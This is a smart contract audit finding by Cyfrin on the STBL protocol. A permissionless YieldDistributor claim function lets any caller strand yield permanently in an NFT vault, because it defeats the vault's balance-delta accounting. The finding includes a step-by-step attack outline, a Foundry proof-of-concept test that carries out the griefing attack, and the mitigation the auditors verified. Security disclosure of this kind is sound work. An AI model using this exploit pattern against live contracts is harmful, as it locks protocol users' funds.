---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-17-cyfrin-stbl-ess-v2-0-1-0
ingested_at: '2026-08-16T05:02:10Z'
protocol_category: []
published_at: '2026-06-17T00:00:00Z'
related_swc: []
severity: High
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-17-cyfrin-stbl-ess-v2-0
title: Yield permanently locked in `STBL_XLayer_NFT_Vault` via permissionless `YieldDistributor::claim`
  defeating balance-delta measurement in `_Vault_claimYield`
vuln_class: []
---

# Yield permanently locked in `STBL_XLayer_NFT_Vault` via permissionless `YieldDistributor::claim` defeating balance-delta measurement in `_Vault_claimYield`

_Section severity (from Solodit section header): High_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-17-cyfrin-stbl-ess-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md)_

---

**Description:** `STBL_XLayer_NFT_Vault` holds YLD NFTs in structured "lots" and provides `STBL_XLayer_NFT_Vault::claimYield so a `WRAPPER_MANAGER_ROLE` holder can collect yield rewards from each NFT's underlying YieldDistributor. The function uses a per-NFT balance-before/after snapshot to measure the claimed amount: it records the vault's ERC-20 token balance before calling `iSTBL_T1e_YieldDistributor.claim(nftId)`, then transfers the observed delta to the caller.

The flaw is that `STBL_XLayer_Asset_YieldDistributor` inherits `claim(uint256 id)` from `STBL_T1e_YieldDistributor` and does not override it. The function is `external` with **no access control** — despite its NatSpec stating "Can only be called by the token owner or authorized operator", no such check exists in the implementation. Any EOA can call it for any NFT ID at any time. When called for a vault-held NFT, the distributor executes `IERC20(token).safeTransfer(YToken.ownerOf(id), reward)`, which sends the reward tokens to the vault contract (the ERC-721 owner of the NFT). This inflates the vault's ERC-20 balance before the legitimate `claimYield()` call runs.

Any external actor can enumerate vault lot contents via the public view functions `fetchLotCounter()` and `fetchLotDetails()`, then call `distributor.claim(nftId)` directly at any time that pending rewards exist — which happens automatically as the global reward index accrues. No privileges, no setup, and no financial cost beyond gas are required.

When `_Vault_claimYield()` subsequently calls the same distributor, `stakingData[nftId].earned` is already zero and no transfer occurs. The guard `if (balanceAfter > balancesBefore[i])` is false because `balancesBefore[i]` already reflects the pre-claimed rewards. The tokens remain in the vault. Neither `STBL_ESS_NFT_Vault1` nor `STBL_XLayer_NFT_Vault` contains a rescue or sweep function, making the stranded tokens permanently unrecoverable. The attack is repeatable on every reward distribution cycle, permanently disabling yield collection for all active lots.

Attack Details:
1. Attacker calls `fetchLotCounter()` and `fetchLotDetails(lotId)` to enumerate NFT IDs held in vault lots — both are public view functions.
2. Rewards accrue over time via `distributeReward()` on the YieldDistributor; `stakingData[nftId].earned > 0`.
3. Attacker calls `YieldDistributor.claim(nftId)` — no modifier, call succeeds unconditionally.
4. Inside `iClaim()`: `stakingData[nftId].earned` is zeroed, `safeTransfer(vault, reward)` executes. Vault ERC-20 balance increases by `reward`.
5. `WRAPPER_MANAGER_ROLE` holder calls `vault.claimYield(lotId)`.
6. `_Vault_claimYield` records `balancesBefore[i]` = vault balance (already includes `reward` from step 4).
7. `_Vault_claimYield` calls `distributor.claim(nftId)` — earned is 0, distributor transfers nothing.
8. `balanceAfter == balancesBefore[i]`; guard fails; 0 transferred to caller.
9. `reward` tokens remain stranded in the vault with no recovery path.

**Impact:** Yield permanently locked in STBL_ESS_NFT_Vault1

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./XLayer_Setup.sol";
import {iSTBL_T1e_YieldDistributor} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/interfaces/ISTBL_T1e_YieldDistributor.sol";

/// @title   YieldClaimGriefing_PoC
/// @notice  PoC: Any caller can invoke STBL_XLayer_Asset_YieldDistributor.claim() directly,
///          sending rewards to the vault (NFT owner) before claimYield() runs.
///          The vault's balance-delta guard then sees zero delta and transfers nothing,
///          permanently stranding the pre-claimed tokens with no recovery path.
/// @dev     Affected: STBL_ESS_NFT_Vault1._Vault_claimYield() (lines 177-220)
///                    STBL_T1e_YieldDistributor.claim() (permissionless)
/// @dev     Impact:   WRAPPER_MANAGER_ROLE receives 0 yield; tokens locked in vault forever
/// @dev     Author:   0xStalin
contract YieldClaimGriefing_PoC is XLayer_Setup {
    uint256 constant DEPOSIT_AMOUNT = 9696 * 10 ** 18;

    function setUp() public override {
        super.setUp();
        mintTestTokensToUser(user1, 100_000 * 10 ** 18);
        approveWrapperForUser(user1);
    }

    /// @notice PoC: Permissionless claim() permanently strands yield in vault
    /// Title:    Yield permanently locked in STBL_ESS_NFT_Vault1 via permissionless
    ///           YieldDistributor.claim() defeating balance-delta measurement in _Vault_claimYield
    /// Affected: STBL_ESS_NFT_Vault1._Vault_claimYield() (lines 177-220)
    ///           STBL_T1e_YieldDistributor.claim() (no access control despite NatSpec claim)
    /// Impact:   WRAPPER_MANAGER_ROLE receives 0 yield; yield tokens permanently locked in vault
    /// Author:   0xStalin
    function test_poc_permissionless_claim_permanently_strands_yield() public {
        address attacker = makeAddr("attacker");

        // == [ Set Up ] ==

        // == [ Step 1: User deposits to receive ESS tokens and a lot with 2 YLD NFTs ] ==
        vm.startPrank(user1);
        uint256 lotId = xLayerWrapper.ess_deposit(DEPOSIT_AMOUNT);
        vm.stopPrank();

        console.log("[*] Deposit complete. lotId:", lotId);
        console.log("[*] ESS tokens minted to user1:", xLayerToken.balanceOf(user1) / 1e18);

        // Fetch lot details to obtain each NFT ID and its distributor
        iSTBL_ESS_NFT_Vault1.lotStruct memory lot = xLayerNFTVault.fetchLotDetails(lotId);
        console.log("[*] NFTs in lot:", lot.ids.length);
        require(lot.ids.length == 2, "Pre-condition: lot must contain exactly 2 NFTs");

        // Resolve each NFT's reward distributor via registry
        address[] memory distributors = new address[](lot.ids.length);
        for (uint256 i = 0; i < lot.ids.length; i++) {
            YLD_Metadata memory metadata = yld.getNFTData(lot.ids[i]);
            AssetDefinition memory assetData = registry.fetchAssetData(metadata.assetID);
            distributors[i] = assetData.rewardDistributor;
            console.log("[*] NFT index:", i);
            console.log("[*]   NFT id:", lot.ids[i]);
            console.log("[*]   distributor:", distributors[i]);
        }

        // == [ Distribute Yield ] ==

        // == [ Step 2: Increase oracle prices and warp time to generate pending rewards ] ==
        // Asset 1 oracle: setPrice() 7 times
        for (uint256 i = 0; i < 7; i++) {
            testOracle1.setPrice();
        }
        // Asset 2 oracle: setPrice() 60 times
        for (uint256 i = 0; i < 60; i++) {
            testOracle2.setPrice();
        }

        // Advance time past the yieldDuration (configured as 1 day in setUp)
        vm.warp(block.timestamp + 2 days);

        // Trigger yield distribution for both asset vaults (must be called as wrapper)
        vm.startPrank(address(xLayerWrapper));
        vault1.distributeYield();
        vault2.distributeYield();
        vm.stopPrank();

        // == [ Step 3: Verify pre-condition — both NFTs have pending rewards ] ==
        uint256 pendingReward0 = iSTBL_T1e_YieldDistributor(distributors[0]).calculateRewardsEarned(lot.ids[0]);
        uint256 pendingReward1 = iSTBL_T1e_YieldDistributor(distributors[1]).calculateRewardsEarned(lot.ids[1]);
        console.log("[*] Pending reward NFT 0 (pre-attack):", pendingReward0);
        console.log("[*] Pending reward NFT 1 (pre-attack):", pendingReward1);
        require(pendingReward0 > 0, "Pre-condition: NFT 0 must have pending rewards");
        require(pendingReward1 > 0, "Pre-condition: NFT 1 must have pending rewards");

        // == [ Execute Attack ] ==

        // == [ Step 4: Attacker calls claim() directly on each distributor — no access control ] ==
        // The NatSpec states "Can only be called by the token owner or authorized operator"
        // but no such check exists in STBL_T1e_YieldDistributor.claim(). Any EOA succeeds.
        // Rewards are sent to YToken.ownerOf(nftId) = the vault, increasing vault's token balance.
        uint256 vaultToken1Before = testToken1.balanceOf(address(xLayerNFTVault));
        uint256 vaultToken2Before = testToken2.balanceOf(address(xLayerNFTVault));

        vm.startPrank(attacker);
        iSTBL_T1e_YieldDistributor(distributors[0]).claim(lot.ids[0]);
        iSTBL_T1e_YieldDistributor(distributors[1]).claim(lot.ids[1]);
        vm.stopPrank();

        uint256 vaultToken1AfterAttack = testToken1.balanceOf(address(xLayerNFTVault));
        uint256 vaultToken2AfterAttack = testToken2.balanceOf(address(xLayerNFTVault));

        console.log("[*] Vault token1 balance after attacker claim:", vaultToken1AfterAttack);
        console.log("[*] Vault token2 balance after attacker claim:", vaultToken2AfterAttack);

        // Confirm rewards now sit in the vault (pre-claimed by attacker)
        assertGt(
            vaultToken1AfterAttack,
            vaultToken1Before,
            "Pre-condition: vault must have received token1 rewards via attacker claim"
        );
        assertGt(
            vaultToken2AfterAttack,
            vaultToken2Before,
            "Pre-condition: vault must have received token2 rewards via attacker claim"
        );
        console.log("[+] CONFIRMED: Attacker successfully triggered claim() with zero authorization");

        // == [ Verify Impact ] ==

        // == [ Step 5: WrapperManager calls claimYield() — balance-delta is zero, receives nothing ] ==
        // The distributors already transferred rewards to the vault above. When the vault now
        // calls distributor.claim() internally, earned == 0. balanceAfter == balancesBefore.
        // The guard `if (balanceAfter > balancesBefore[i])` fails and 0 is transferred to caller.
        uint256 wmToken1Before = testToken1.balanceOf(wrapperManager);
        uint256 wmToken2Before = testToken2.balanceOf(wrapperManager);

        vm.prank(wrapperManager);
        uint256[] memory claimed = xLayerNFTVault.claimYield(lotId);

        uint256 wmToken1Received = testToken1.balanceOf(wrapperManager) - wmToken1Before;
        uint256 wmToken2Received = testToken2.balanceOf(wrapperManager) - wmToken2Before;

        // == [ Step 6: Assert goal condition — manager received 0, vault holds stranded tokens ] ==
        uint256 strandedToken1 = testToken1.balanceOf(address(xLayerNFTVault));
        uint256 strandedToken2 = testToken2.balanceOf(address(xLayerNFTVault));

        // WrapperManager received ZERO despite yield having been distributed
        assertEq(wmToken1Received, 0, "GRIEF: WrapperManager received 0 token1 despite distributed yield");
        assertEq(wmToken2Received, 0, "GRIEF: WrapperManager received 0 token2 despite distributed yield");
        // Tokens are permanently stranded in vault
        assertGt(strandedToken1, 0, "LOCKED: Token1 permanently stranded in vault");
        assertGt(strandedToken2, 0, "LOCKED: Token2 permanently stranded in vault");

        // Sanity: claimYield itself also returned zero for every slot
        for (uint256 i = 0; i < claimed.length; i++) {
            assertEq(claimed[i], 0, "GRIEF: claimedAmounts array must be all-zero");
        }

        console.log("[+] CONFIRMED: Yield collection permanently griefed");
        console.log("[+]   Attacker cost: 0 tokens (gas only)");
        console.log("[+]   Token1 stranded in vault:", strandedToken1);
        console.log("[+]   Token2 stranded in vault:", strandedToken2);
        console.log("[+]   WrapperManager received: 0 / 0 (token1 / token2)");
    }
}

// forge test --match-test test_poc_permissionless_claim_permanently_strands_yield --match-path foundry_test/YieldClaimGriefing_PoC.t.sol -vvv
```

**Recommended Mitigation:** Consider restricting the distributor's `claim` function so it can only be called by the `nftVault`, ensuring external callers cannot pre-claim rewards to zero out the distributor balance before the balance-delta snapshot runs. Make sure to update the rest of the contracts to be compatible with this restriction, meaning, yield claiming should be routed through the nftVault.

**STBL:** Fixed in commits [c581339](https://github.com/USD-Pi-Protocol/stbl-contracts-evm-ess-common/commit/c581339d5ecc22a598ad05fd7ac09e7f33bb40af) & [5ec3804](https://github.com/USD-Pi-Protocol/stbl-contracts-evm-ess-common/commit/5ec38042af12b364f7ae30ce448f05129c22ec7a).

**Cyfrin:** Verified. `STBL_XLayer_Asset_YieldDistributor::claim` now enforces `msg.sender == nftVault`, making the distributor no longer permissionlessly callable — external callers can no longer pre-claim  rewards to zero out the distributor balance before `_Vault_claimYield` runs its balance-delta snapshot. As a second layer of defense, the vault's `_Vault_claimYield` override also adds a sweep phase that transfers any token balance  already sitting in the vault to yieldRecipient before the base balance-delta logic executes, catching any residual stranded tokens.
